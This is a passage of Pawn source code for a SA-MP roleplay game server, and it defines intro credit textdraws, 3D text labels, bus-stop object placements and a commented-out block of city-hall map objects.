	IntroText8[22] = TextDrawCreate(288,323,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[22],0.399999,5.899996); TextDrawAlignment(IntroText8[22],0); TextDrawBackgroundColor(IntroText8[22],0x000000FF); TextDrawFont(IntroText8[22],3); TextDrawUseBox(IntroText8[22],1); TextDrawBoxColor(IntroText8[22],0x000000FF); TextDrawTextSize(IntroText8[22],363.000000,333.000000); TextDrawSetOutline(IntroText8[22],0); TextDrawSetProportional(IntroText8[22],1); TextDrawSetShadow(IntroText8[22],1);
	IntroText8[23] = TextDrawCreate(352,-105,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[23],0.399999,5.399997); TextDrawAlignment(IntroText8[23],0); TextDrawBackgroundColor(IntroText8[23],0x000000FF); TextDrawFont(IntroText8[23],3); TextDrawUseBox(IntroText8[23],1); TextDrawBoxColor(IntroText8[23],0x000000FF); TextDrawTextSize(IntroText8[23],421.000000,-95.000000); TextDrawSetOutline(IntroText8[23],0); TextDrawSetProportional(IntroText8[23],1); TextDrawSetShadow(IntroText8[23],1);
	IntroText8[24] = TextDrawCreate(303,-95,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[24],0.399999,5.399997); TextDrawAlignment(IntroText8[24],0); TextDrawBackgroundColor(IntroText8[24],0x000000FF); TextDrawFont(IntroText8[24],3); TextDrawUseBox(IntroText8[24],1); TextDrawBoxColor(IntroText8[24],0x000000FF); TextDrawTextSize(IntroText8[24],352.000000,-85.000000); TextDrawSetOutline(IntroText8[24],0); TextDrawSetProportional(IntroText8[24],1); TextDrawSetShadow(IntroText8[24],1);
	IntroText8[25] = TextDrawCreate(-1,103,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[25],0.399999,5.899996); TextDrawAlignment(IntroText8[25],0); TextDrawBackgroundColor(IntroText8[25],0x000000FF); TextDrawFont(IntroText8[25],3); TextDrawUseBox(IntroText8[25],1); TextDrawBoxColor(IntroText8[25],0x000000FF); TextDrawTextSize(IntroText8[25],234.000000,113.000000); TextDrawSetOutline(IntroText8[25],0); TextDrawSetProportional(IntroText8[25],1); TextDrawSetShadow(IntroText8[25],1);
	IntroText8[26] = TextDrawCreate(236,113,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[26],0.349999,5.199997); TextDrawAlignment(IntroText8[26],0); TextDrawBackgroundColor(IntroText8[26],0x000000FF); TextDrawFont(IntroText8[26],3); TextDrawUseBox(IntroText8[26],1); TextDrawBoxColor(IntroText8[26],0x000000FF); TextDrawTextSize(IntroText8[26],236.000000,123.000000); TextDrawSetOutline(IntroText8[26],0); TextDrawSetProportional(IntroText8[26],1); TextDrawSetShadow(IntroText8[26],1);
	IntroText8[27] = TextDrawCreate(148,131,"~y~Owner"); TextDrawLetterSize(IntroText8[27],0.850000,3.099999); TextDrawAlignment(IntroText8[27],0); TextDrawBackgroundColor(IntroText8[27],0x000000FF); TextDrawFont(IntroText8[27],0); TextDrawUseBox(IntroText8[27],0); TextDrawSetOutline(IntroText8[27],0); TextDrawSetProportional(IntroText8[27],1); TextDrawSetShadow(IntroText8[27],0);
	IntroText8[28] = TextDrawCreate(185,244,"~y~Maper"); TextDrawLetterSize(IntroText8[28],0.850000,3.099999); TextDrawAlignment(IntroText8[28],0); TextDrawBackgroundColor(IntroText8[28],0x000000FF); TextDrawFont(IntroText8[28],0); TextDrawUseBox(IntroText8[28],0); TextDrawSetOutline(IntroText8[28],0); TextDrawSetProportional(IntroText8[28],1); TextDrawSetShadow(IntroText8[28],0);
	IntroText8[29] = TextDrawCreate(137,158,"Arman"); TextDrawLetterSize(IntroText8[29],0.500000,2.399999); TextDrawAlignment(IntroText8[29],0); TextDrawBackgroundColor(IntroText8[29],0x658379FF); TextDrawFont(IntroText8[29],1); TextDrawUseBox(IntroText8[29],0); TextDrawSetOutline(IntroText8[29],0); TextDrawSetProportional(IntroText8[29],1); TextDrawSetShadow(IntroText8[29],0);
	IntroText8[30] = TextDrawCreate(227,270,"-"); TextDrawLetterSize(IntroText8[30],0.500000,2.399999); TextDrawAlignment(IntroText8[30],3); TextDrawBackgroundColor(IntroText8[30],0x658379FF); TextDrawFont(IntroText8[30],1); TextDrawUseBox(IntroText8[30],0); TextDrawSetOutline(IntroText8[30],0); TextDrawSetProportional(IntroText8[30],1); TextDrawSetShadow(IntroText8[30],0);
	IntroText9[0] = TextDrawCreate(300,104,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[0],0.500000,3.899998); TextDrawAlignment(IntroText9[0],0); TextDrawBackgroundColor(IntroText9[0],0x000000FF); TextDrawFont(IntroText9[0],3); TextDrawUseBox(IntroText9[0],1); TextDrawBoxColor(IntroText9[0],0x000000FF); TextDrawTextSize(IntroText9[0],368.000000,114.000000); TextDrawSetOutline(IntroText9[0],0); TextDrawSetProportional(IntroText9[0],1); TextDrawSetShadow(IntroText9[0],1);
	IntroText9[1] = TextDrawCreate(171,114,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[1],0.500000,3.899998); TextDrawAlignment(IntroText9[1],0); TextDrawBackgroundColor(IntroText9[1],0x000000FF); TextDrawFont(IntroText9[1],3); TextDrawUseBox(IntroText9[1],1); TextDrawBoxColor(IntroText9[1],0x000000FF); TextDrawTextSize(IntroText9[1],239.000000,124.000000); TextDrawSetOutline(IntroText9[1],0); TextDrawSetProportional(IntroText9[1],1); TextDrawSetShadow(IntroText9[1],1);
	IntroText9[2] = TextDrawCreate(232,125,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[2],0.500000,3.899998); TextDrawAlignment(IntroText9[2],0); TextDrawBackgroundColor(IntroText9[2],0x000000FF); TextDrawFont(IntroText9[2],3); TextDrawUseBox(IntroText9[2],1); TextDrawBoxColor(IntroText9[2],0x000000FF); TextDrawTextSize(IntroText9[2],300.000000,135.000000); TextDrawSetOutline(IntroText9[2],0); TextDrawSetProportional(IntroText9[2],1); TextDrawSetShadow(IntroText9[2],1);
	IntroText9[3] = TextDrawCreate(355,96,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[3],0.500000,3.899998); TextDrawAlignment(IntroText9[3],0); TextDrawBackgroundColor(IntroText9[3],0x000000FF); TextDrawFont(IntroText9[3],3); TextDrawUseBox(IntroText9[3],1); TextDrawBoxColor(IntroText9[3],0x000000FF); TextDrawTextSize(IntroText9[3],423.000000,106.000000); TextDrawSetOutline(IntroText9[3],0); TextDrawSetProportional(IntroText9[3],1); TextDrawSetShadow(IntroText9[3],1);
	IntroText9[4] = TextDrawCreate(301,112,"~l~/"); TextDrawLetterSize(IntroText9[4],0.800000,12.300010); TextDrawAlignment(IntroText9[4],0); TextDrawBackgroundColor(IntroText9[4],0x000000FF); TextDrawFont(IntroText9[4],3); TextDrawUseBox(IntroText9[4],0); TextDrawSetOutline(IntroText9[4],0); TextDrawSetProportional(IntroText9[4],1); TextDrawSetShadow(IntroText9[4],0);
	IntroText9[5] = TextDrawCreate(295,201,"~l~/"); TextDrawLetterSize(IntroText9[5],0.800000,12.300010); TextDrawAlignment(IntroText9[5],0); TextDrawBackgroundColor(IntroText9[5],0x000000FF); TextDrawFont(IntroText9[5],3); TextDrawUseBox(IntroText9[5],0); TextDrawSetOutline(IntroText9[5],0); TextDrawSetProportional(IntroText9[5],1); TextDrawSetShadow(IntroText9[5],0);
	IntroText9[6] = TextDrawCreate(233,145,"~l~/"); TextDrawLetterSize(IntroText9[6],0.800000,12.300010); TextDrawAlignment(IntroText9[6],0); TextDrawBackgroundColor(IntroText9[6],0x000000FF); TextDrawFont(IntroText9[6],3); TextDrawUseBox(IntroText9[6],0); TextDrawSetOutline(IntroText9[6],0); TextDrawSetProportional(IntroText9[6],1); TextDrawSetShadow(IntroText9[6],0);
	IntroText9[7] = TextDrawCreate(227,231,"~l~/"); TextDrawLetterSize(IntroText9[7],0.800000,12.300010); TextDrawAlignment(IntroText9[7],0); TextDrawBackgroundColor(IntroText9[7],0x000000FF); TextDrawFont(IntroText9[7],3); TextDrawUseBox(IntroText9[7],0); TextDrawSetOutline(IntroText9[7],0); TextDrawSetProportional(IntroText9[7],1); TextDrawSetShadow(IntroText9[7],0);
	IntroText9[8] = TextDrawCreate(197,313,"~l~/"); TextDrawLetterSize(IntroText9[8],7.350009,-1.000000); TextDrawAlignment(IntroText9[8],0); TextDrawBackgroundColor(IntroText9[8],0x000000FF); TextDrawFont(IntroText9[8],3); TextDrawUseBox(IntroText9[8],0); TextDrawSetOutline(IntroText9[8],0); TextDrawSetProportional(IntroText9[8],1); TextDrawSetShadow(IntroText9[8],0);
	IntroText9[9] = TextDrawCreate(186,317,"~l~/"); TextDrawLetterSize(IntroText9[9],7.350009,-1.000000); TextDrawAlignment(IntroText9[9],0); TextDrawBackgroundColor(IntroText9[9],0x000000FF); TextDrawFont(IntroText9[9],3); TextDrawUseBox(IntroText9[9],0); TextDrawSetOutline(IntroText9[9],0); TextDrawSetProportional(IntroText9[9],1); TextDrawSetShadow(IntroText9[9],0);
	IntroText9[10] = TextDrawCreate(358,113,"~l~/"); TextDrawLetterSize(IntroText9[10],7.350009,-1.000000); TextDrawAlignment(IntroText9[10],0); TextDrawBackgroundColor(IntroText9[10],0x000000FF); TextDrawFont(IntroText9[10],3); TextDrawUseBox(IntroText9[10],0); TextDrawSetOutline(IntroText9[10],0); TextDrawSetProportional(IntroText9[10],1); TextDrawSetShadow(IntroText9[10],0);
	IntroText9[11] = TextDrawCreate(364,110,"~l~/"); TextDrawLetterSize(IntroText9[11],7.350009,-1.000000); TextDrawAlignment(IntroText9[11],0); TextDrawBackgroundColor(IntroText9[11],0x000000FF); TextDrawFont(IntroText9[11],3); TextDrawUseBox(IntroText9[11],0); TextDrawSetOutline(IntroText9[11],0); TextDrawSetProportional(IntroText9[11],1); TextDrawSetShadow(IntroText9[11],0);
	IntroText9[12] = TextDrawCreate(337,346,"~l~/"); TextDrawLetterSize(IntroText9[12],7.350009,-1.000000); TextDrawAlignment(IntroText9[12],0); TextDrawBackgroundColor(IntroText9[12],0x000000FF); TextDrawFont(IntroText9[12],3); TextDrawUseBox(IntroText9[12],0); TextDrawSetOutline(IntroText9[12],0); TextDrawSetProportional(IntroText9[12],1); TextDrawSetShadow(IntroText9[12],0);
	IntroText9[13] = TextDrawCreate(324,347,"~l~/"); TextDrawLetterSize(IntroText9[13],7.350009,-1.000000); TextDrawAlignment(IntroText9[13],0); TextDrawBackgroundColor(IntroText9[13],0x000000FF); TextDrawFont(IntroText9[13],3); TextDrawUseBox(IntroText9[13],0); TextDrawSetOutline(IntroText9[13],0); TextDrawSetProportional(IntroText9[13],1); TextDrawSetShadow(IntroText9[13],0);
	IntroText9[14] = TextDrawCreate(423,87,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[14],0.500000,4.299998); TextDrawAlignment(IntroText9[14],0); TextDrawBackgroundColor(IntroText9[14],0x000000FF); TextDrawFont(IntroText9[14],3); TextDrawUseBox(IntroText9[14],1); TextDrawBoxColor(IntroText9[14],0x000000FF); TextDrawTextSize(IntroText9[14],640.000000,97.000000); TextDrawSetOutline(IntroText9[14],0); TextDrawSetProportional(IntroText9[14],1); TextDrawSetShadow(IntroText9[14],1);
	IntroText9[15] = TextDrawCreate(-40,89,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[15],0.500000,4.299998); TextDrawAlignment(IntroText9[15],0); TextDrawBackgroundColor(IntroText9[15],0x000000FF); TextDrawFont(IntroText9[15],3); TextDrawUseBox(IntroText9[15],1); TextDrawBoxColor(IntroText9[15],0x000000FF); TextDrawTextSize(IntroText9[15],177.000000,99.000000); TextDrawSetOutline(IntroText9[15],0); TextDrawSetProportional(IntroText9[15],1); TextDrawSetShadow(IntroText9[15],1);
	IntroText9[16] = TextDrawCreate(-10,-90,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[16],0.500000,4.299998); TextDrawAlignment(IntroText9[16],0); TextDrawBackgroundColor(IntroText9[16],0x000000FF); TextDrawFont(IntroText9[16],3); TextDrawUseBox(IntroText9[16],1); TextDrawBoxColor(IntroText9[16],0x000000FF); TextDrawTextSize(IntroText9[16],238.000000,-80.000000); TextDrawSetOutline(IntroText9[16],0); TextDrawSetProportional(IntroText9[16],1); TextDrawSetShadow(IntroText9[16],1);
	IntroText9[17] = TextDrawCreate(58,-100,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[17],0.500000,4.299998); TextDrawAlignment(IntroText9[17],0); TextDrawBackgroundColor(IntroText9[17],0x000000FF); TextDrawFont(IntroText9[17],3); TextDrawUseBox(IntroText9[17],1); TextDrawBoxColor(IntroText9[17],0x000000FF); TextDrawTextSize(IntroText9[17],306.000000,-90.000000); TextDrawSetOutline(IntroText9[17],0); TextDrawSetProportional(IntroText9[17],1); TextDrawSetShadow(IntroText9[17],1);
	IntroText9[18] = TextDrawCreate(122,-134,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[18],0.500000,4.299998); TextDrawAlignment(IntroText9[18],0); TextDrawBackgroundColor(IntroText9[18],0x000000FF); TextDrawFont(IntroText9[18],3); TextDrawUseBox(IntroText9[18],1); TextDrawBoxColor(IntroText9[18],0x000000FF); TextDrawTextSize(IntroText9[18],370.000000,-124.000000); TextDrawSetOutline(IntroText9[18],0); TextDrawSetProportional(IntroText9[18],1); TextDrawSetShadow(IntroText9[18],1);
	IntroText9[19] = TextDrawCreate(361,-168,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[19],0.500000,4.299998); TextDrawAlignment(IntroText9[19],0); TextDrawBackgroundColor(IntroText9[19],0x000000FF); TextDrawFont(IntroText9[19],3); TextDrawUseBox(IntroText9[19],1); TextDrawBoxColor(IntroText9[19],0x000000FF); TextDrawTextSize(IntroText9[19],653.000000,-158.000000); TextDrawSetOutline(IntroText9[19],0); TextDrawSetProportional(IntroText9[19],1); TextDrawSetShadow(IntroText9[19],1);
	IntroText9[20] = TextDrawCreate(-60,305,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[20],0.500000,4.299998); TextDrawAlignment(IntroText9[20],0); TextDrawBackgroundColor(IntroText9[20],0x000000FF); TextDrawFont(IntroText9[20],3); TextDrawUseBox(IntroText9[20],1); TextDrawBoxColor(IntroText9[20],0x000000FF); TextDrawTextSize(IntroText9[20],232.000000,315.000000); TextDrawSetOutline(IntroText9[20],0); TextDrawSetProportional(IntroText9[20],1); TextDrawSetShadow(IntroText9[20],1);
	IntroText9[21] = TextDrawCreate(5,312,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[21],0.500000,4.299998); TextDrawAlignment(IntroText9[21],0); TextDrawBackgroundColor(IntroText9[21],0x000000FF); TextDrawFont(IntroText9[21],3); TextDrawUseBox(IntroText9[21],1); TextDrawBoxColor(IntroText9[21],0x000000FF); TextDrawTextSize(IntroText9[21],297.000000,322.000000); TextDrawSetOutline(IntroText9[21],0); TextDrawSetProportional(IntroText9[21],1); TextDrawSetShadow(IntroText9[21],1);
	IntroText9[22] = TextDrawCreate(79,335,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[22],0.500000,4.299998); TextDrawAlignment(IntroText9[22],0); TextDrawBackgroundColor(IntroText9[22],0x000000FF); TextDrawFont(IntroText9[22],3); TextDrawUseBox(IntroText9[22],1); TextDrawBoxColor(IntroText9[22],0x000000FF); TextDrawTextSize(IntroText9[22],371.000000,345.000000); TextDrawSetOutline(IntroText9[22],0); TextDrawSetProportional(IntroText9[22],1); TextDrawSetShadow(IntroText9[22],1);
	IntroText9[23] = TextDrawCreate(328,346,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[23],0.500000,4.299998); TextDrawAlignment(IntroText9[23],0); TextDrawBackgroundColor(IntroText9[23],0x000000FF); TextDrawFont(IntroText9[23],3); TextDrawUseBox(IntroText9[23],1); TextDrawBoxColor(IntroText9[23],0x000000FF); TextDrawTextSize(IntroText9[23],649.000000,356.000000); TextDrawSetOutline(IntroText9[23],0); TextDrawSetProportional(IntroText9[23],1); TextDrawSetShadow(IntroText9[23],1);
	IntroText9[24] = TextDrawCreate(193,317,"~l~/"); TextDrawLetterSize(IntroText9[24],7.350009,-1.000000); TextDrawAlignment(IntroText9[24],0); TextDrawBackgroundColor(IntroText9[24],0x000000FF); TextDrawFont(IntroText9[24],3); TextDrawUseBox(IntroText9[24],0); TextDrawSetOutline(IntroText9[24],0); TextDrawSetProportional(IntroText9[24],1); TextDrawSetShadow(IntroText9[24],0);
	IntroText9[25] = TextDrawCreate(318,348,"~l~/"); TextDrawLetterSize(IntroText9[25],7.350009,-1.000000); TextDrawAlignment(IntroText9[25],0); TextDrawBackgroundColor(IntroText9[25],0x000000FF); TextDrawFont(IntroText9[25],3); TextDrawUseBox(IntroText9[25],0); TextDrawSetOutline(IntroText9[25],0); TextDrawSetProportional(IntroText9[25],1); TextDrawSetShadow(IntroText9[25],0);
	IntroText9[26] = TextDrawCreate(371,99,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[26],0.500000,3.899998); TextDrawAlignment(IntroText9[26],0); TextDrawBackgroundColor(IntroText9[26],0x000000FF); TextDrawFont(IntroText9[26],3); TextDrawUseBox(IntroText9[26],1); TextDrawBoxColor(IntroText9[26],0x000000FF); TextDrawTextSize(IntroText9[26],371.000000,109.000000); TextDrawSetOutline(IntroText9[26],0); TextDrawSetProportional(IntroText9[26],1); TextDrawSetShadow(IntroText9[26],1);
	IntroText9[27] = TextDrawCreate(420,97,"_~n~_~n~_~n~_~n~_~n~_~n~_"); TextDrawLetterSize(IntroText9[27],0.500000,3.899998); TextDrawAlignment(IntroText9[27],0); TextDrawBackgroundColor(IntroText9[27],0x000000FF); TextDrawFont(IntroText9[27],3); TextDrawUseBox(IntroText9[27],1); TextDrawBoxColor(IntroText9[27],0x000000FF); TextDrawTextSize(IntroText9[27],420.000000,107.000000); TextDrawSetOutline(IntroText9[27],0); TextDrawSetProportional(IntroText9[27],1); TextDrawSetShadow(IntroText9[27],1);
	IntroText9[28] = TextDrawCreate(420,97,"~y~Scripter"); TextDrawLetterSize(IntroText9[28],0.850000,3.099999); TextDrawAlignment(IntroText9[28],0); TextDrawBackgroundColor(IntroText9[28],0x000000FF); TextDrawFont(IntroText9[28],0); TextDrawUseBox(IntroText9[28],0); TextDrawSetOutline(IntroText9[28],0); TextDrawSetProportional(IntroText9[28],1); TextDrawSetShadow(IntroText9[28],0);
	IntroText9[29] = TextDrawCreate(422,125,"Amir"); TextDrawLetterSize(IntroText9[29],0.500000,2.399999); TextDrawAlignment(IntroText9[29],1); TextDrawBackgroundColor(IntroText9[29],0x658379FF); TextDrawFont(IntroText9[29],1); TextDrawUseBox(IntroText9[29],0); TextDrawSetOutline(IntroText9[29],0); TextDrawSetProportional(IntroText9[29],1); TextDrawSetShadow(IntroText9[29],0);
    IntroText10[0] = TextDrawCreate(-1,0,"~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~"); TextDrawLetterSize(IntroText10[0],0.449999,5.499997); TextDrawAlignment(IntroText10[0],0); TextDrawBackgroundColor(IntroText10[0],0x000000FF); TextDrawFont(IntroText10[0],3); TextDrawUseBox(IntroText10[0],1); TextDrawBoxColor(IntroText10[0],0x000000FF); TextDrawTextSize(IntroText10[0],662.000000,10.000000); TextDrawSetOutline(IntroText10[0],0); TextDrawSetProportional(IntroText10[0],1); TextDrawSetShadow(IntroText10[0],1);
	IntroText10[1] = TextDrawCreate(270,197," ~r~Joker~g~GaminG"); TextDrawLetterSize(IntroText10[1],0.500000,2.399999); TextDrawAlignment(IntroText10[1],0); TextDrawBackgroundColor(IntroText10[1],0x658379FF); TextDrawFont(IntroText10[1],1); TextDrawUseBox(IntroText10[1],0); TextDrawSetOutline(IntroText10[1],0); TextDrawSetProportional(IntroText10[1],1); TextDrawSetShadow(IntroText10[1],0);
	IntroText10[2] = TextDrawCreate(203,168,"~y~Information"); TextDrawLetterSize(IntroText10[2],0.850000,3.099999); TextDrawAlignment(IntroText10[2],0); TextDrawBackgroundColor(IntroText10[2],0x000000FF); TextDrawFont(IntroText10[2],0); TextDrawUseBox(IntroText10[2],0); TextDrawSetOutline(IntroText10[2],0); TextDrawSetProportional(IntroText10[2],1); TextDrawSetShadow(IntroText10[2],0);
//------------------------------------------------------------------------------
	//3DTextLabels
	NPCTextBlue = Create3DTextLabel("VahedRaniLs", 0x6495EDFF, 0.0, 0.0, 0.0, 30.0,0, 0);
	NPCTextBlack = Create3DTextLabel("VahedRaniLs", 0x6495EDFF, 0.0, 0.0, 0.0, 30.0,0, 0);
	Create3DTextLabel("Press F to Exit", 0x6495EDFF, 2021.9740,2235.6626,2103.9536, 15.0,2);
	Create3DTextLabel("Press F to Exit", 0x6495EDFF, 2021.9740,2235.6626,2103.9536, 15.0,3);

	//Vehicles
    

    //Objects
    CreateObject(1257, 2868.9033203125, -1416.40625, 11.013171195984, 0, 0, 179.99450683594);//Bus Stops
    CreateObject(1257, 2636.32421875, -1693.125, 10.954420089722, 0, 0, 179.99450683594);
    CreateObject(1257, 2649.0073242188, -1710.6044921875, 11.185441970825, 0, 0, 0);
    CreateObject(1257, 2243.845703125, -1725.912109375, 13.596067428589, 0, 0, 90);
    CreateObject(1257, 2252.8876953125, -1738.87109375, 13.62606716156, 0, 0, 270);
    CreateObject(1257, 1948.3310546875, -1454.3525390625, 13.596067428589, 0, 0, 90);
    CreateObject(1257, 1926.419921875, -1472.359375, 13.62606716156, 0, 0, 270);
    CreateObject(1257, 1571.064453125, -2188.0107421875, 13.62606716156, 0, 0, 90);
    CreateObject(1257, 1712.9423828125, -1818.71484375, 13.62606716156, 0, 0, 270);
    CreateObject(1257, 1567.0966796875, -1725.4755859375, 13.62606716156, 0, 0, 90);
    CreateObject(1257, 1544.9990234375, -1739.0458984375, 13.62606716156, 0, 0, 270);
    CreateObject(1257, 1503.9716796875, -1027.76171875, 23.770128250122, 0, 0, 83.995971679688);
    CreateObject(1257, 1440.32421875, -1040.7060546875, 23.907316207886, 0, 0, 270);
    CreateObject(1257, 1188.8359375, -1354.6279296875, 13.648303985596, 0, 0, 179.99450683594);
    CreateObject(1257, 1212.8427734375, -1327.83984375, 13.647026062012, 0, 0, 0);
    CreateObject(1257, 861.71252441406, -1313.3009033203, 13.626066970825, 0, 0, 90);
    CreateObject(1257, 850.67578125, -1333.970703125, 13.615329742432, 0, 0, 270);
    CreateObject(1257, 393.69442749023, -1766.2702636719, 5.6197347640991, 0, 0, 90);
    CreateObject(1257, 1705.58984375, -1805.84765625, 13.530066490173, 0, 0, 90);//
SetTimer("RandomMessage",3000,1);
SetTimer("ChangeColor", 1000, true);

	ShadowsRandom = TextDrawCreate(18.000000,428.000000,"Welcome to {57e547}JoKeR GaminG {FFFFFF} RPG SERVER");
	TextDrawAlignment(ShadowsRandom,0);
	TextDrawBackgroundColor(ShadowsRandom, -1061109505);
	TextDrawFont(ShadowsRandom,2);
	TextDrawLetterSize(ShadowsRandom,0.199999,0.899999);
	TextDrawColor(ShadowsRandom, 255);
	TextDrawSetOutline(ShadowsRandom,1);
	TextDrawSetProportional(ShadowsRandom,1);
	TextDrawSetShadow(ShadowsRandom,1);

	SafeOn = 1;
	TrashKhalie[0] = 0;
	TrashKhalie[1] = 0;
	TrashKhalie[2] = 0;
  actor1 = CreateActor(214,2318.4844,-7.4993,26.7496,88.6424);
	
//----------------------------------------------------------[DisCo - CluB]
/*----------------------------------------------------------[Yani CityHall]
	new Test, tmpobjid;
	Test = CreateDynamicObject(5033, 1745.20313, -1882.85156, 26.14060,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(Test, 5, 5040, "shopliquor_las", "lasjmliq1", 0);
	SetDynamicObjectMaterial(Test, 8, 5040, "shopliquor_las", "lasjmliq1", 0);
	SetDynamicObjectMaterial(Test, 2, 4113, "lanbloka", "sl_laoffblokwall1", 0);
	SetDynamicObjectMaterial(Test, 6, 5040, "shopliquor_las", "lasjmliq1", 0);
	tmpobjid = CreateDynamicObject(2395,1722.805,-1858.355,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1722.810,-1855.604,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1722.809,-1861.096,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1719.072,-1857.763,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1719.067,-1855.022,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1722.795,-1852.882,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1726.549,-1861.090,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1730.280,-1861.084,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1734.010,-1861.078,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1737.734,-1861.074,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1741.456,-1861.068,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1745.177,-1861.062,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
